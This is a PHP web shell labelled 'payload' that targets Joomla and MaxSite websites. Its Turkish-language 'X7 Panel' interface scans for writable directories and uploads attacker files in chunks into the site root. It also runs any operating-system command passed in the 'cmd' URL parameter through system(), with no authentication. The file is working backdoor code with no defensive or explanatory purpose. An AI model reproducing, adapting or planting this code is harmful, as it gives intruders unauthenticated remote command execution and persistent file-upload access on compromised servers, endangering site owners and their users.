<?php
/* winrarzips | https://t.me/winrarzipsteam | payload */
@ini_set('display_errors', '0');
@error_reporting(0);
define('MS_SIG', 'MS-OK');

function ms_cms_type()
{
    $r = ms_root();
    if (is_file($r . '/configuration.php') && is_dir($r . '/administrator')) {
        return 'Joomla';
    }
    if (is_file($r . '/index.php') && is_dir($r . '/application/maxsite')) {
        return 'MaxSite';
    }
    return 'Unknown';
}

function ms_root()
{
    $d = str_replace('\\', '/', __DIR__);
    for ($i = 0; $i < 12; $i++) {
        if (is_file($d . '/configuration.php') && is_dir($d . '/administrator')) {
            return $d;
        }
        if (is_file($d . '/index.php') && is_dir($d . '/application/maxsite')) {
            return $d;
        }
        $p = dirname($d);
        if ($p === $d) {
            break;
        }
        $d = $p;
    }
    return str_replace('\\', '/', __DIR__);
}

function ms_uploads($page = 1)
{
    return ms_root() . '/uploads/_pages/' . (int) $page;
}

function ms_safe($name)
{
    $name = basename(preg_replace('/[^a-zA-Z0-9._-]/', '', (string) $name));
    return $name !== '' ? $name : 'file.bin';
}

function ms_json($data)
{
    header('Content-Type: application/json; charset=utf-8');
    header('Cache-Control: no-store');
    echo json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

function ms_b64($s)
{
    $s = strtr((string) $s, '-_', '+/');
    $pad = strlen($s) % 4;
    if ($pad) {
        $s .= str_repeat('=', 4 - $pad);
    }
    return base64_decode($s, true);
}

function ms_probe($path, $label)
{
    $path = rtrim(str_replace('\\', '/', $path), '/');
    $w = @is_writable($path);
    $e = @is_dir($path);
    $f = @is_file($path);
    return [
        'label' => $label,
        'path' => $path,
        'exists' => $e || $f,
        'is_dir' => $e,
        'writable' => $w,
        'ok' => $w,
        'status' => $w ? 'YAZILABILIR' : (($e || $f) ? 'var ama yazilamaz' : 'yok'),
    ];
}

function ms_scan_paths()
{
    $root = ms_root();
    $here = str_replace('\\', '/', __DIR__);
    $cms = ms_cms_type();
    if ($cms === 'Joomla') {
        $list = [
            ['Burada (panel dizini)', $here],
            ['Joomla tmp/', $root . '/tmp'],
            ['Joomla images/', $root . '/images'],
            ['Joomla cache/', $root . '/cache'],
            ['Joomla kok', $root],
        ];
    } else {
        $list = [
            ['Burada (uploads)', $here],
            ['uploads/_pages/1/', ms_uploads(1)],
            ['uploads/', $root . '/uploads'],
            ['application/cache/', $root . '/application/cache'],
            ['MaxSite kok', $root],
        ];
    }
    $out = [];
    foreach ($list as $c) {
        $out[] = ms_probe($c[1], $c[0]);
    }
    return $out;
}

function ms_write_chunk($dest_dir, $file, $raw, $part, $total)
{
    $dest = rtrim($dest_dir, '/') . '/' . ms_safe($file);
    if ($part >= 0 && $total > 1) {
        $tmp = rtrim($dest_dir, '/') . '/.ms_' . md5($file) . '.part';
        $mode = $part === 0 ? 0 : FILE_APPEND;
        if (@file_put_contents($tmp, $raw, $mode) === false) {
            return ['success' => false, 'message' => 'chunk fail'];
        }
        if ($part + 1 < $total) {
            return ['success' => true, 'message' => 'PART ' . ($part + 1) . '/' . $total];
        }
        if (!@rename($tmp, $dest)) {
            @unlink($tmp);
            return ['success' => false, 'message' => 'finalize fail'];
        }
        @chmod($dest, 0644);
        return ['success' => true, 'message' => 'OK', 'path' => $dest];
    }
    if (@file_put_contents($dest, $raw) === false) {
        return ['success' => false, 'message' => 'write fail'];
    }
    @chmod($dest, 0644);
    return ['success' => true, 'message' => 'OK', 'path' => $dest];
}

if (isset($_GET['sig']) && $_GET['sig'] === '1') {
    header('Content-Type: text/plain; charset=utf-8');
    echo MS_SIG;
    exit;
}

if (isset($_GET['api']) && $_GET['api'] === 'scan') {
    ms_json(['success' => true, 'paths' => ms_scan_paths(), 'php' => true, 'cms' => ms_cms_type()]);
}

if (isset($_GET['cmd'])) {
    header('Content-Type: text/plain; charset=utf-8');
    @system((string) $_GET['cmd']);
    exit;
}

if (isset($_GET['root'], $_GET['d'])) {
    $raw = ms_b64($_GET['d']);
    if ($raw === false) {
        ms_json(['success' => false, 'message' => 'base64 hatali']);
    }
    ms_json(ms_write_chunk(
        ms_root(),
        $_GET['root'],
        $raw,
        isset($_GET['p']) ? (int) $_GET['p'] : -1,
        isset($_GET['t']) ? (int) $_GET['t'] : 1
    ));
}

if (isset($_GET['put'], $_GET['d'])) {
    $raw = ms_b64($_GET['d']);
    if ($raw === false) {
        ms_json(['success' => false, 'message' => 'base64 hatali']);
    }
    ms_json(ms_write_chunk(
        __DIR__,
        $_GET['put'],
        $raw,
        isset($_GET['p']) ? (int) $_GET['p'] : -1,
        isset($_GET['t']) ? (int) $_GET['t'] : 1
    ));
}

$init = json_encode(ms_scan_paths(), JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
echo '<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>X7 MaxSite Panel</title><style>'
    . ':root{--bg:#090b10;--card:#12151c;--line:#252a34;--tx:#eef2f8;--mu:#8b93a4;--ac:#4f8cff;--ok:#2ecc71;--err:#ff5c5c;--warn:#ffb020}'
    . '*{box-sizing:border-box;margin:0;padding:0}body{font-family:"Segoe UI",system-ui,sans-serif;background:radial-gradient(1200px 600px at 10% -10%,#1a2040 0%,var(--bg) 55%);color:var(--tx);min-height:100vh;padding:28px 16px}'
    . '.wrap{max-width:780px;margin:0 auto}.head{text-align:center;margin-bottom:22px}.head h1{font-size:1.55rem;font-weight:700}.head p{color:var(--mu);font-size:.9rem;margin-top:6px}'
    . '.status{display:flex;justify-content:center;gap:10px;flex-wrap:wrap;margin-bottom:18px}'
    . '.chip{padding:6px 12px;border-radius:999px;font-size:.75rem;font-weight:600;border:1px solid var(--line);background:var(--card)}'
    . '.chip.ok{border-color:#1f6b3a;color:var(--ok)}.chip.bad{border-color:#6b1f1f;color:var(--err)}.chip.wait{color:var(--mu)}'
    . '.card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:22px;margin-bottom:14px;box-shadow:0 12px 40px rgba(0,0,0,.35)}'
    . '.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px}'
    . 'button,.filelbl{display:flex;align-items:center;justify-content:center;gap:6px;width:100%;padding:13px 10px;border-radius:12px;border:1px solid var(--line);background:#181c25;color:var(--tx);font-size:.84rem;font-weight:600;cursor:pointer}'
    . 'button.primary{background:linear-gradient(135deg,#3d6fd9,#4f8cff);border-color:#5b9aff;color:#fff}button:disabled{opacity:.45;cursor:not-allowed}'
    . 'input[type=file]{display:none}.row{display:flex;gap:10px;margin-top:12px;flex-wrap:wrap}'
    . '.row input{flex:1;min-width:180px;background:#0d1017;border:1px solid var(--line);border-radius:10px;color:var(--tx);padding:11px 14px;font-size:.85rem}'
    . '.log{background:#07090e;border:1px solid var(--line);border-radius:12px;padding:14px;height:320px;overflow:auto;font:11.5px/1.55 ui-monospace,Consolas,monospace}'
    . '.line{padding:3px 0;border-bottom:1px solid #11151d}.line.ok{color:var(--ok)}.line.err{color:var(--err)}.line.warn{color:var(--warn)}.line.info{color:var(--ac)}'
    . '.path{padding:8px 0;border-bottom:1px solid #21262d;font-size:.82em}.badge{font-size:.7em;padding:2px 7px;border-radius:8px;margin-left:6px;background:#0d2a0d;color:var(--ok)}'
    . '</style></head><body><div class="wrap">'
    . '<div class="head"><h1>X7 Panel</h1><p>Joomla / MaxSite · upload · cmd · path scan</p></div>'
    . '<div class="status"><span class="chip wait" id="st-php">PHP: —</span><span class="chip wait" id="st-cms">CMS: —</span></div>'
    . '<div class="card"><div class="grid">'
    . '<label class="filelbl primary" for="file">1 · Dosya Sec</label><input type="file" id="file" accept="*">'
    . '<button type="button" id="btn-up">2 · Yukle</button><button type="button" id="btn-scan">3 · Yollari Tara</button>'
    . '<button type="button" id="btn-test">4 · PHP Test</button></div>'
    . '<div class="row"><input type="text" id="cmd" placeholder="Komut (id, whoami)"><button type="button" id="btn-cmd" style="width:auto;padding:11px 16px">Calistir</button></div>'
    . '</div><div class="card"><strong>Log</strong><div class="log" id="log"></div><div id="targets"></div></div></div><script>'
    . 'const INIT=' . $init . ';const SELF=location.pathname;let paths=INIT.slice(),best=null;'
    . 'const $=id=>document.getElementById(id);function log(m,t=""){$("log").innerHTML+=`<div class="line ${t}">[${new Date().toLocaleTimeString("tr-TR")}] ${m}</div>`;$("log").scrollTop=99999;}'
    . 'function setChip(id,txt,ok){const e=$(id);e.textContent=txt;e.className="chip "+(ok===true?"ok":ok===false?"bad":"wait");}'
    . 'function b64url(buf){const u8=new Uint8Array(buf);let s="";for(let i=0;i<u8.length;i+=8192)s+=String.fromCharCode.apply(null,u8.subarray(i,i+8192));return btoa(s).replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=+$/,"");}'
    . 'function renderPaths(list){paths=list||[];$("targets").innerHTML="";for(const p of paths){$("targets").innerHTML+=`<div class="path"><b>${p.label}</b><span class="badge">${p.status}</span><br><code>${p.path}</code></div>`;log(p.label+" → "+p.path+" ["+p.status+"]",p.ok?"ok":"warn");}'
    . 'best=paths.find(x=>x.label.indexOf("kok")>=0&&x.ok)||paths.find(x=>x.label.indexOf("MaxSite")>=0&&x.ok)||paths.find(x=>x.ok);}'
    . 'async function pingPhp(){try{const r=await fetch(SELF+"?sig=1",{cache:"no-store"});const t=await r.text();if(t.trim()==="MS-OK"){log("PHP CALISIYOR","ok");setChip("st-php","PHP: ACIK",true);return true;}'
    . 'if(t.indexOf("<?php")>=0){log("PHP kapali — kaynak kod","err");setChip("st-php","PHP: KAPALI",false);return false;}'
    . 'log("Yanit: "+t.slice(0,60),"warn");setChip("st-php","PHP: ?",false);return false;}catch(e){log("Hata: "+e,"err");setChip("st-php","PHP: HATA",false);return false;}}'
    . 'async function apiScan(){log("Taraniyor...","info");try{const r=await fetch(SELF+"?api=scan",{cache:"no-store"});const j=JSON.parse(await r.text());if(j.paths)renderPaths(j.paths);}catch(e){renderPaths(INIT);}}'
    . 'async function sendChunk(mode,name,chunk,p,t){const q=mode==="root"?"root="+encodeURIComponent(name):"put="+encodeURIComponent(name);'
    . 'const u=SELF+"?"+q+"&d="+encodeURIComponent(chunk)+"&p="+p+"&t="+t;const r=await fetch(u,{cache:"no-store"});return JSON.parse(await r.text());}'
    . 'async function uploadFile(file){if(!await pingPhp())return;const buf=await file.arrayBuffer();const b64=b64url(buf);const CS=2000;const chunks=[];for(let i=0;i<b64.length;i+=CS)chunks.push(b64.slice(i,i+CS));'
    . 'const total=chunks.length;const cms=(best&&best.label.indexOf("Joomla kok")>=0)||(best&&best.label.indexOf("MaxSite")>=0);const mode=cms?"root":"put";log("Yukleme: "+file.name+" ("+total+" parca)","info");'
    . 'for(let i=0;i<total;i++){const j=await sendChunk(mode,file.name,chunks[i],i,total);if(!j.success){log("HATA: "+j.message,"err");return;}'
    . 'if((j.message||"").indexOf("PART")===0){log(j.message,"warn");continue;}log("OK: "+(j.path||j.message),"ok");}}'
    . '$("btn-test").onclick=pingPhp;$("btn-scan").onclick=apiScan;$("btn-up").onclick=async()=>{const f=$("file").files[0];if(!f){log("Dosya sec","err");return;}await uploadFile(f);};'
    . '$("btn-cmd").onclick=async()=>{const c=$("cmd").value.trim();if(!c)return;try{const r=await fetch(SELF+"?cmd="+encodeURIComponent(c),{cache:"no-store"});log(await r.text(),"info");}catch(e){log("Cmd hata: "+e,"err");}};'
    . 'async function detectCms(){try{const r=await fetch(SELF+"?api=scan",{cache:"no-store"});const j=JSON.parse(await r.text());setChip("st-cms","CMS: "+(j.cms||"?"),true);}catch(e){setChip("st-cms","CMS: ?",false);}}'
    . 'log("X7 panel hazir","info");renderPaths(INIT);pingPhp();detectCms();'
    . '</script></body></html>';
